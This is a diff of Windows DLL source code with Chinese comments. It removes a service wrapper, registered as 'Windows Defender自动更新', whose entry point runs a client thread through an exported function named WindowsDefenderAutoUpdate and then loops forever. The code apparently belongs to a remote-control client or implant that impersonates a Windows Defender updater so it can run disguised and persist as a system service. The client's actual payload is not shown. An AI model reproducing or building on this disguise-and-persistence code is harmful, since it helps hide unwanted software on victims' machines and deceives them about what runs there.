@@ -65,8 +65,6 @@ int wmain(int argc, wchar_t *argv[]) {
 
 #ifdef _RELEASE
 
-
-
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
 	LPVOID lpReserved
@@ -94,94 +92,6 @@ extern "C" _declspec(dllexport) void WindowsDefenderAutoUpdate() {
 	HANDLE hRebornThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartClientThreadFunc, pThreadParam, 0, NULL);
 
 	WaitForSingleObject(hRebornThread, INFINITE);
-}
-
-
-
-
-
-void WINAPI ServiceCtrlHandle(DWORD dwOperateCode);
-BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress);
-void MyCode();
-
-// 全局变量
-WCHAR g_szServiceName[MAX_PATH] = L"Windows Defender自动更新";    // 服务名称 
-SERVICE_STATUS_HANDLE g_ServiceStatusHandle = { 0 };
-
-
-// 服务的入口函数
-extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
-{
-	g_ServiceStatusHandle = RegisterServiceCtrlHandler(g_szServiceName, ServiceCtrlHandle);
-
-	TellSCM(SERVICE_START_PENDING, 0, 1);
-	TellSCM(SERVICE_RUNNING, 0, 0);
-
-	// 执行我们的代码
-	MyCode();
-
-	while (TRUE){
-		Sleep(5000);
-	}
-}
-
-
-// 服务的处理回调的函数
-void WINAPI ServiceCtrlHandle(DWORD dwOperateCode){
-
-	switch (dwOperateCode)
-	{
-	case SERVICE_CONTROL_PAUSE:
-	{
-		// 暂停
-		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
-		TellSCM(SERVICE_PAUSED, 0, 0);
-		break;
-	}
-	case SERVICE_CONTROL_CONTINUE:
-	{
-		// 继续
-		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
-		TellSCM(SERVICE_RUNNING, 0, 0);
-		break;
-	}
-	case SERVICE_CONTROL_STOP:
-	{
-		// 停止
-		TellSCM(SERVICE_STOP_PENDING, 0, 1);
-		TellSCM(SERVICE_STOPPED, 0, 0);
-		break;
-	}
-	case SERVICE_CONTROL_INTERROGATE:
-	{
-		// 询问
-		break;
-	}
-	default:
-		break;
-	}
-}
-
-
-BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress){
-
-	SERVICE_STATUS serviceStatus = { 0 };
-	BOOL bRet = FALSE;
-
-	RtlZeroMemory(&serviceStatus, sizeof(serviceStatus));
-	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-	serviceStatus.dwCurrentState = dwState;
-	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
-	serviceStatus.dwWin32ExitCode = dwExitCode;
-	serviceStatus.dwWaitHint = 3000;
-
-	bRet = SetServiceStatus(g_ServiceStatusHandle, &serviceStatus);
-	return bRet;
-}
-
-
-void MyCode(){
-	WindowsDefenderAutoUpdate();
 }
 
 
